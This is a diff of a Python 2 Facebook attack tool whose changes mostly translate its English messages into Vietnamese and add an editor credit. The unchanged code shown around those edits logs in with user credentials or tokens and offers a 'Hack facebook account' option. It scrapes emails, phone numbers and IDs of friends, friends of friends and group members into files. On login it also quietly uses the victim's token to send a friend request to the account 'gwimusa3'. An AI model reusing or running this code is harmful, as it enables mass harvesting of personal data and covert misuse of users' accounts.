@@ -58,6 +58,7 @@ logo = """
 \033[1;97m╔═══════════════════════════════════════════════════════╗
 \033[1;97m║\033[1;93m* \033[1;97mDevlop By: \033[1;91m: \033[1;96mDEVILAND       \033[1;97m                         ║
 \033[1;97m║\033[1;93m* \033[1;97mNotice \033[1;91m : \033[1;96m   Only Use Token For Login   \033[1;97m             ║
+\033[1;97m║\033[1;93m* \033[1;97mChỉnh Sửa Bởi \033[1;91m : \033[1;96m   Youtuber Hoangdzsvip   \033[1;97m             ║
 \033[1;97m╚═══════════════════════════════════════════════════════╝"""
 
 
@@ -96,13 +97,13 @@ vuln = "\033[32mVuln"
 def tool_main_function():
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tokens login"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m login thông thường"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m login token"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
 	print "\033[1;97m║"
 	login_method = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if login_method =="":
-		print"\033[1;91m[!] Wrong input"
+		print"\033[1;91m[!] Nhập sai"
 		exit()
 	elif login_method =="1":
 		login()
@@ -111,7 +112,7 @@ def tool_main_function():
 	elif login_method =="0":
 		exit()
 	else:
-		print"\033[1;91m[!] Wrong input"
+		print"\033[1;91m[!] Nhập sai"
 		exit()
 
 ##### LOGIN #####
@@ -131,7 +132,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;91m[!] No connection"
+			print"\n\033[1;91m[!] Không có kết nối"
 			exit()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -153,11 +154,11 @@ def login():
 				pick = open("login.txt", 'w')
 				pick.write(z['access_token'])
 				pick.close()
-				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
+				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin thành công'
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;91m[!] No connection"
+				print"\n\033[1;91m[!] Không có kết nối"
 				exit()
 		if 'checkpoint' in url:
 			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
@@ -165,7 +166,7 @@ def login():
 			time.sleep(1)
 			exit()
 		else:
-			print("\n\033[1;91m[!] Login Failed")
+			print("\n\033[1;91m[!] Login Thất Bại")
 			os.system('rm -rf login.txt')
 			time.sleep(0.01)
 			login()
@@ -184,8 +185,8 @@ def fbtoken():
 		pick.close()
 		menu()
 	except KeyError:
-		print "\033[1;91m[!] Wrong"
-		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		print "\033[1;91m[!] sai"
+		e = raw_input("\033[1;91m[?] \033[1;92mLogin bằng token?\033[1;97m[y/n]: ")
 		if e =="":
 			exit()
 		elif e =="y":
@@ -200,7 +201,7 @@ def menu():
 		fb_token=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -216,30 +217,30 @@ def menu():
 		time.sleep(0.01)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[!] No connection"
+		print"\033[1;91m[!] Không có kết nối"
 		exit()
 	os.system("reset")
 	print logo
 	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+fb_name+"\033[1;97m"
 	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
 	print "\033[1;97m╚"+40*"═"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m User information"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Thông tin người dùng"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get Id/email/hp"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Hack facebook account               "
 	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot       "
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Others           "
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Khác           "
 	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Show token           "
         print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Update           "
-	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Delete trash          "
-	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m LogOut            "
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit the programs          "
+	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Xóa thùng rác          "
+	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Đăng xuất           "
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Thoát khỏi chương trình          "
 	print "║"
 	choices()
 #-
 def choices():
 	pick = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if pick =="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choices()
 	elif pick =="1":
 		information()
@@ -274,7 +275,7 @@ def choices():
 	elif pick =="0":
 		exit()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choices()
 
 ##### INFO #####
@@ -283,14 +284,14 @@ def information():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không Tìm Thấy Token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
-	mkdir('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+	aid = raw_input('\033[1;91m[+] \033[1;92mNhập ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
+	mkdir('\033[1;91m[✺] \033[1;92mĐợi Một Chút \033[1;97m...')
 	r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
 	tryy = json.loads(r.text)
 	for i in tryy['data']:
@@ -300,35 +301,35 @@ def information():
 			print 42*"\033[1;97m═"
 			try:
 				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']
-			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
+			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mkhông tìm thấy'
 			try:
 				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
-			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
+			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mkhông tìm thấy'
 			try:
 				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
-			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
+			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mkhông tìm thấy'
 			try:
 				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
-			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
+			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mkhông tìm thấy'
 			try:
 				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
-			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
+			except KeyError: print '\033[1;91m[?] \033[1;92mVị Trí\033[1;97m      : \033[1;91mkhông tìm thấy'
 			try:
 				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
-			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
+			except KeyError: print '\033[1;91m[?] \033[1;92mNgày sinh\033[1;97m : \033[1;91mkhông tìm thấy'
 			try:
-				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '
+				print '\033[1;91m[➹] \033[1;92mTrường Học\033[1;97m        : '
 				for q in z['education']:
 					try:
 						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
-					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
+					except KeyError: print '\033[1;91m                   ~ \033[1;91mkhông tìm thấy'
 			except KeyError: pass
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			menu()
 		else:
 			pass
 	else:
-		print"\033[1;91m[✖] User not found"
+		print"\033[1;91m[✖] Không Tìm Thấy Người Dùng"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu()
 
@@ -338,21 +339,21 @@ def dump():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get group member ID"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member email"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member phone number"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get email friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get a friend's phone number"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID bạn bè"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID Bạn Của Bạn Bè"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get ID thành viên Group"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get email thành viên group"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get SDT Thành viên group"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get email bạn bè"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email bạn của bạn bè"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get SDT Của Tất Cả Bạn Bè"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get STD Của tất Cả Bạn Của Bạn Bè"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	choose_dump()
@@ -360,7 +361,7 @@ def dump():
 def choose_dump():
 	choose_from = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if choose_from =="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập Sai"
 		choose_dump()
 	elif choose_from =="1":
 		friends_id()
@@ -383,7 +384,7 @@ def choose_dump():
 	elif choose_from =="0":
 		menu()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập Sai"
 		choose_dump()
 
 ##### ID friends #####
@@ -392,7 +393,7 @@ def friends_id():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không Tìm Thấy Token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -405,7 +406,7 @@ def friends_id():
 		print logo
 		r=requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
 		z=json.loads(r.text)
-		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet id tất cả bạn bè \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/friends_id.txt','w')
 		for a in z['data']:
@@ -413,27 +414,27 @@ def friends_id():
 			make_action.write(a['id'] + '\n')
 			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
 		make_action.close()
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfriends))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet id thành công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ ID \033[1;91m: \033[1;97m%s"%(len(idfriends))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu Tệp Với Tên\033[1;91m :\033[1;97m ")
 		os.rename('out/friends_id.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mLưu File \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Lỗi khi tạo tệp"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] Lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không Có Kết Nối"
 		exit()
 
 ##### ID FROM FRIENDS #####
@@ -442,7 +443,7 @@ def id_from_friends():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -453,18 +454,18 @@ def id_from_friends():
 	try:
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;91m[+] \033[1;92mNhập ID bạn bè \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
 			op = json.loads(seat.text)
 			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;91m[!] Friend not found"
+			print"\033[1;91m[!] Không tìm thấy bạn bè"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			dump()
 		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+fb_token)
 		z=json.loads(r.text)
-		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet tất cả id bạn của bạn bè \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/friends_id_from_friends.txt','w')
 		for a in z['friends']['data']:
@@ -472,19 +473,19 @@ def id_from_friends():
 			make_action.write(a['id'] + '\n')
 			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
 		make_action.close()
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromfriends))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet id thành công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ ID \033[1;91m: \033[1;97m%s"%(len(idfromfriends))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu tệp với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/friends_id_from_friends.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mTệp Đã Lưu \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Không Thể Tạo tệp"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
@@ -492,15 +493,15 @@ def id_from_friends():
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kết nối"
 		exit()
 
-##### ID FROM GROUP MEMBER #####
+##### ID Từ Group MEMBER #####
 def id_member_group():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -511,16 +512,16 @@ def id_member_group():
 	try:
 		os.system('clear')
 		print logo
-		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		id=raw_input('\033[1;91m[+] \033[1;92mNhập ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
 			asw=json.loads(r.text)
-			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ Nhóm \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
-			print"\033[1;91m[!] Group not found"
+			print"\033[1;91m[!] Không Tìm Thấy  Group"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			dump()
-		mkdir('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet id thành viên group \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/member_group.txt','w')
 		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999999&access_token='+fb_token)
@@ -530,35 +531,35 @@ def id_member_group():
 			make_action.write(a['id'] + '\n')
 			print ("\r\033[1;97m[ \033[1;92m"+str(len(member_id))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
 		make_action.close()
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet id thành công \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(member_id))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu tệp với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/member_group.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mĐã lưu tệp \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Không thể tạo tệp"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] Lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kết nối"
 		exit()
 
-##### EMAIL FROM group #####
+##### EMAIL Từ Group #####
 def em_member_group():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -569,16 +570,16 @@ def em_member_group():
 	try:
 		os.system('clear')
 		print logo
-		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		id=raw_input('\033[1;91m[+] \033[1;92mNhập ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
 			asw=json.loads(r.text)
-			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ group \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
-			print"\033[1;91m[!] Group not found"
+			print"\033[1;91m[!] Không tìm thấy group"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			dump()
-		mkdir('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet email thành viên group \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/em_member_group.txt','w')
 		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)
@@ -594,35 +595,35 @@ def em_member_group():
 				pass
 		make_action.close()
 		print 42*"\033[1;97m═"
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet email thành vien group thành công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ Email \033[1;91m: \033[1;97m%s"%(len(emmem))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu tệp với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/em_member_group.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mĐã lưu tệp \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Không thể tạp tệp"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] Lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kết nối"
 		exit()
 
-##### PHONE NUMBER FROM GROUP #####
+##### PHONE NUMBER Từ Group #####
 def no_member_group():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -633,16 +634,16 @@ def no_member_group():
 	try:
 		os.system('clear')
 		print logo
-		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		id=raw_input('\033[1;91m[+] \033[1;92mNhập ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
 			asw=json.loads(r.text)
-			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ group \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
-			print"\033[1;91m[!] Group not found"
+			print"\033[1;91m[!] Không tìm thấy group"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			dump()
-		mkdir('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet SDT Thành viên group \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/no_member_group.txt','w')
 		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)
@@ -658,27 +659,27 @@ def no_member_group():
 				pass
 		make_action.close()
 		print 42*"\033[1;97m═"
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(number))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet SDT Thành viên group thành công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ số \033[1;91m: \033[1;97m%s"%(len(number))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mlưu tệp với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/no_member_group.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mĐã Lưu \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Không thể tạo tệp"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] Lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kết nối"
 		exit()
 
 ##### EMAIL #####
@@ -686,7 +687,7 @@ def email():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -699,7 +700,7 @@ def email():
 		print logo
 		r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
 		a = json.loads(r.text)
-		mkdir('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet email của tất cả bạn bè \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/email_friends.txt','w')
 		for i in a['data']:
@@ -713,27 +714,27 @@ def email():
 				pass
 		make_action.close()
 		print 42*"\033[1;97m═"
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet email thành công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ Email \033[1;91m: \033[1;97m%s"%(len(em))
